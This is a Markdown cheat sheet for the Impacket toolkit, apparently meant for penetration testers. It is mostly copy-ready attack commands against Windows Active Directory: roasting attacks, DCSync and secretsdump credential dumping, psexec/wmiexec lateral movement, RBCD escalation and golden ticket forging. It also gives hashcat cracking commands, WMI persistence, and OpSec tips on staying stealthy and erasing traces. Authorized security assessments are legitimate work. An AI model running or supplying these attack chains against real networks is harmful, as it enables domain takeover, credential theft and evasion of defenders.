# Impacket Quick Reference Guide

## Authentication Methods (Universal)
```bash
# Password authentication
python3 tool.py domain.com/user:password@target

# NTLM hash authentication  
python3 tool.py -hashes :ntlmhash domain.com/user@target

# Kerberos authentication
python3 tool.py -k domain.com/user@target -dc-ip 192.168.1.10

# AES key authentication
python3 tool.py -aesKey aes_key domain.com/user@target -k
```

## Essential Attack Chains

### 🎯 Initial Access
```bash
# ASREPRoast (no creds needed)
python3 GetNPUsers.py domain.com/ -dc-ip DC_IP -request

# Kerberoasting (valid creds needed)
python3 GetUserSPNs.py domain.com/user:pass -dc-ip DC_IP -request
```

### 🔓 Credential Extraction
```bash
# Domain Controller (DCSync)
python3 secretsdump.py domain.com/admin:pass@dc.domain.com -just-dc

# Workstation/Server
python3 secretsdump.py domain.com/admin:pass@target.domain.com

# Local files
python3 secretsdump.py -sam sam -security security -system system LOCAL
```

### 🚀 Lateral Movement
```bash
# PSExec (SMB + Service)
python3 psexec.py domain.com/admin:pass@target

# WMIExec (WMI + DCOM)
python3 wmiexec.py domain.com/admin:pass@target

# SMBExec (SMB without service)
python3 smbexec.py domain.com/admin:pass@target

# DCOM Exec
python3 dcomexec.py domain.com/admin:pass@target

# Scheduled Tasks
python3 atexec.py domain.com/admin:pass@target "command"
```

### ⬆️ Privilege Escalation
```bash
# Add Computer + RBCD
python3 addcomputer.py domain.com/user:pass -computer-name EVIL$
python3 rbcd.py domain.com/user:pass -action write -delegate-from EVIL$ -delegate-to TARGET$
python3 getST.py domain.com/EVIL$:pass -spn cifs/TARGET$ -impersonate administrator

# Child to Parent Domain
python3 raiseChild.py child.domain.com/admin:pass
```

### 🎫 Kerberos Attacks
```bash
# Request TGT
python3 getTGT.py domain.com/user:pass -dc-ip DC_IP

# Request Service Ticket
python3 getST.py domain.com/user:pass -spn service/target

# Golden Ticket
python3 ticketer.py -nthash krbtgt_hash -domain-sid SID -domain domain.com admin

# Silver Ticket
python3 ticketer.py -nthash service_hash -spn service/target -domain domain.com admin
```

## Quick Tool Reference

### 📊 Enumeration
| Tool | Purpose | Example |
|------|---------|---------|
| `GetADUsers.py` | User enumeration | `python3 GetADUsers.py domain.com/user:pass -all` |
| `GetADComputers.py` | Computer enumeration | `python3 GetADComputers.py domain.com/user:pass -all` |
| `rpcdump.py` | RPC endpoint enum | `python3 rpcdump.py domain.com/user:pass@target` |
| `samrdump.py` | SAM database enum | `python3 samrdump.py domain.com/user:pass@target` |
| `lookupsid.py` | SID enumeration | `python3 lookupsid.py domain.com/user:pass@target` |

### 🔑 Credential Attacks
| Tool | Purpose | Hashcat Mode |
|------|---------|--------------|
| `GetNPUsers.py` | ASREPRoast | `-m 18200` |
| `GetUserSPNs.py` | Kerberoasting | `-m 13100` |
| `secretsdump.py` | Hash extraction | N/A |
| `ntlmrelayx.py` | NTLM relay | N/A |

### 🌐 Network Services
| Tool | Protocol | Port |
|------|----------|------|
| `smbclient.py` | SMB | 445 |
| `mssqlclient.py` | MSSQL | 1433 |
| `smbserver.py` | SMB Server | 445 |
| `wmiquery.py` | WMI | 135 |

### 🛠️ System Operations
| Tool | Purpose | Example |
|------|---------|---------|
| `reg.py` | Registry ops | `python3 reg.py domain.com/user:pass@target` |
| `services.py` | Service mgmt | `python3 services.py domain.com/user:pass@target` |
| `wmipersist.py` | WMI persistence | `python3 wmipersist.py domain.com/user:pass@target` |

## Common Command Patterns

### File Operations
```bash
# SMB file access
python3 smbclient.py domain.com/user:pass@target
# In shell: shares, use C$, ls, get file.txt, put file.txt

# Registry operations
python3 reg.py domain.com/user:pass@target -keyName "HKLM\SOFTWARE\Key"

# NTFS operations
python3 ntfs-read.py domain.com/user:pass@target
```

### Information Gathering
```bash
# Network discovery
python3 netview.py domain.com/user:pass -target target

# Machine role detection
python3 machine_role.py domain.com/user:pass@target

# Architecture detection
python3 getArch.py target.domain.com
```

### Database Access
```bash
# MSSQL client
python3 mssqlclient.py domain.com/user:pass@sql.domain.com -windows-auth

# MSSQL instance enumeration
python3 mssqlinstance.py target.domain.com
```

## Hash Cracking Quick Reference

### Hashcat Hash Types
- **ASREPRoast**: `-m 18200`
- **Kerberoasting**: `-m 13100` (RC4), `-m 19600` (AES128), `-m 19700` (AES256)
- **NTLM**: `-m 1000`
- **NetNTLMv2**: `-m 5600`

### Common Crack Commands
```bash
# ASREPRoast
hashcat -m 18200 asrep.hash rockyou.txt

# Kerberoasting
hashcat -m 13100 spn.hash rockyou.txt --rules=best64.rule

# NTLM hashes
hashcat -m 1000 ntlm.hash rockyou.txt
```

## Error Troubleshooting

### Common Errors & Solutions
| Error | Solution |
|-------|----------|
| `Clock skew too great` | `ntpdate dc.domain.com` |
| `SMB signing required` | Use different target or protocol |
| `Access denied` | Verify credentials and permissions |
| `Connection timeout` | Check network connectivity and firewall |
| `KDC_ERR_PREAUTH_FAILED` | Wrong password or account locked |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | User doesn't exist |

### Network Testing
```bash
# Test SMB connectivity
nc -zv target 445

# Test Kerberos connectivity  
nc -zv dc 88

# Test RPC connectivity
nc -zv target 135
```

## OpSec Tips

### 🤫 Stealth Techniques
- Use Kerberos auth instead of NTLM when possible
- Use WMI instead of SMB for execution
- Enable stealth mode: `GetUserSPNs.py -stealth`
- Use legitimate service names and computer names
- Clean up: remove added computers, services, files

### 🧹 Cleanup Commands
```bash
# Remove added computer
python3 addcomputer.py domain.com/admin:pass -computer-name EVIL$ -delete

# Remove RBCD config
python3 rbcd.py domain.com/user:pass -action remove -delegate-from SOURCE$ -delegate-to TARGET$

# Remove service
python3 services.py domain.com/admin:pass@target -action delete -name BadService
```

## Environment Variables

### Kerberos
```bash
# Set ticket cache
export KRB5CCNAME=/path/to/ticket.ccache

# Verify ticket
klist

# Clear tickets
kdestroy
```

### Proxy Settings
```bash
# Use with proxychains
proxychains python3 tool.py params

# SOCKS proxy
export SOCKS_PROXY=127.0.0.1:1080
```

## Quick Attack Decision Tree

```
Got Domain Creds?
├─ No → Try GetNPUsers.py (ASREPRoast)  
├─ Yes → Try GetUserSPNs.py (Kerberoast)
        └─ Got Admin Creds?
           ├─ No → Try privilege escalation (RBCD, etc.)
           └─ Yes → Lateral movement & secretsdump.py
```

## Port Reference
- **88**: Kerberos
- **135**: RPC Endpoint Mapper  
- **139**: NetBIOS Session
- **389**: LDAP
- **445**: SMB
- **636**: LDAPS
- **1433**: MSSQL
- **3389**: RDP
- **5985**: WinRM HTTP
- **5986**: WinRM HTTPS

---
*Keep this reference handy during assessments!*
